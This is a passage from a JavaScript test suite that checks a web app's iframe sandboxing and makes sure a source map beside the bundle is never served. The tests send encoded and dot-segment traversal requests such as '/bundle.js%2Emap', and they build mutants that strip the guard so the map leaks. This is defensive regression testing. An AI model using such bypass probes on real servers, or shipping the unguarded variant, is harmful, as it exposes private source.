  ok(M2.every((r, i) => r && r.some((x) => x.startsWith(FRAMES[i][0]) && /srcdoc site/.test(x))), 'MUTANTS (srcdoc back on the preview, the .eml body, the altChunk) ⇒ RED, each by its file', M2);
  const M3 = mutate('src/lib/doc-window-ui.js', "f.setAttribute('sandbox', 'allow-same-origin allow-modals');", "f.setAttribute('sandbox', 'allow-modals');");
  ok(M3 && M3.some((x) => /dead allow-same-origin row/.test(x)) && census(new Map([...TEXTS, ['src/lib/new-viewer.js', "const f = document.createElement('iframe'); f.setAttribute('sandbox', ''); f.srcdoc = html;"]])).some((x) => /new-viewer\.js: 1 srcdoc/.test(x)) && census(new Map([...TEXTS, ['src/lib/new-viewer.js', '// a comment naming allow-same-origin and f.srcdoc = x stays quiet\n']])).length === 0,
    'CONTROLS: a reason row whose site is gone is RED (dead); a NEW viewer\'s srcdoc frame is RED; a comment naming either stays quiet');
}

// ── ⑨ THE SOURCE MAP IS SERVED TO NOBODY ──
console.log('⑨ the source map beside the bundle is served to nobody (lane vault-chip-zone-errors)');
{
  const SP_PATH = path.join(REPO, 'src/server/static-public.js');
  const SP = require(SP_PATH);
  const staticLine = SRV.split('\n').find((l) => l.startsWith("app.use(require('./src/server/static-public.js').create("));
  const at = (needle) => SRV.indexOf(needle);
  ok(!!staticLine && /\.create\(path\.join\(__dirname, 'public'\)\)\);/.test(staticLine) && at("app.get(['/', '/index.html']") < at(staticLine) && at(staticLine) < at('registerWebdav(app, { tokens: mountTokens });') && !/express\.static\(/.test(SRV), 'server.js serves public/ through static-public.js ONLY (no bare express.static), after the index route, before WebDAV', staticLine);
  ok(['/bundle.js.map', '/a/b.MAP', '/bundle.js%2Emap', '/bundle.js%2emap'].every(SP.buildOnly) && !['/bundle.js', '/map', '/x.map/y', '/style.css'].some(SP.buildOnly) && SP.buildOnly('/x%E0%A4%A.map') && !SP.buildOnly('/x%E0%A4%A'), 'buildOnly: a *.map path, judged decoded (%2E is a dot), any case; a malformed escape is judged as sent');
  const MAP_BYTES = '{"version":3,"sources":["../src/client.js"],"mappings":"SECRET-MAP-BYTES"}';
  const serve = async (mod) => {
    const dir = path.join(ROOT, 'static-' + Math.random().toString(16).slice(2)); fs.mkdirSync(path.join(dir, 'public'), { recursive: true });
    fs.writeFileSync(path.join(dir, 'public', 'index.html'), '<!doctype html><html><head><link rel="stylesheet" href="/style.css"></head><body><script src="/bundle.js"></script></body></html>');
    fs.writeFileSync(path.join(dir, 'public', 'style.css'), 'b{}'); fs.writeFileSync(path.join(dir, 'public', 'bundle.js'), 'var x=1;');
    fs.writeFileSync(path.join(dir, 'public', 'bundle.js.map'), MAP_BYTES);
    const app = express();
    const req = (m) => (m === './src/server/static-public.js' ? mod : require(m.startsWith('./') ? path.join(REPO, m) : m));
    new Function('app', 'require', 'path', 'fs', '__dirname', 'cspReports', `${indexRoute}\n${staticLine}`)(app, req, path, fs, dir, { header: () => ['X-Probe', '1'] });
    app.get('/dav/notes.map', (q, r) => r.type('text').send('a later route keeps its own .map path'));
    const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
    return { port: srv.address().port, close: () => new Promise((c) => srv.close(c)) };
  };
  const P = await serve(SP);
  const js = await get(P.port, '/bundle.js'), css = await get(P.port, '/style.css'), page = await get(P.port, '/');
  ok(js.status === 200 && js.text === 'var x=1;' && css.status === 200, 'GET /bundle.js and /style.css: 200, the files (the static door still serves public/)', { js: js.status, css: css.status });
  const tries = ['/bundle.js.map', '/bundle.js%2Emap', '/bundle.js%2emap', '/x/../bundle.js.map', '/./bundle.js.map'];
  const got = []; for (const p of tries) { const r = await get(P.port, p); got.push({ p, status: r.status, leak: (r.text || '').includes('SECRET-MAP-BYTES') }); }
  ok(got.every((g) => g.status === 404 && !g.leak), `GET ${tries.join(' · ')}: 404 each, never the map's bytes (the file IS in public/)`, got);
  const later = await get(P.port, '/dav/notes.map');
  ok(later.status === 200 && /keeps its own/.test(later.text), 'a later route\'s own .map path still answers (a WebDAV file, a proxied page)', later.status);
  ok(page.status === 200 && /bundle\.js\?v=\d+/.test(page.text) && !/\.map/.test(page.text), 'the page names the bundle with its ?v= stamp and no map', page.text.slice(0, 200));
  await P.close();
  const cut = fs.readFileSync(SP_PATH, 'utf8').replace('return (req, res, next) => (buildOnly(req.path) ? next() : serve(req, res, next));', 'return serve;');
  const M = await serve(load(SP_PATH, cut));
  const leak = await get(M.port, '/bundle.js.map');
  ok(cut !== fs.readFileSync(SP_PATH, 'utf8') && leak.status === 200 && leak.text.includes('SECRET-MAP-BYTES'), 'MUTANT (the guard cut: express.static alone) ⇒ RED — GET /bundle.js.map answers 200 with the map', leak.status);
  await M.close();
}

fs.rmSync(ROOT, { recursive: true, force: true }); // the reports this suite made ON PURPOSE (its own exit check reads scratch roots)
console.log(fail ? `\nFAILED (${pass} passed, ${fail} failed)` : `\nALL PASS (${pass})`);
process.exit(fail ? 1 : 0);
